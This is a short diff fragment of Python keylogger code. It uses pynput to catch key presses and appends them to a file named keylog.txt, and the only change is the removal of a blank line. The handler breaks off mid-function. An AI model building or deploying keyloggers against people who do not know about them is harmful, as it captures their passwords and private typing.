@@ -1,6 +1,5 @@
 from pynput import keyboard
 
-
 def on_press(key):
     with open("keylog.txt","a") as f:
         try:
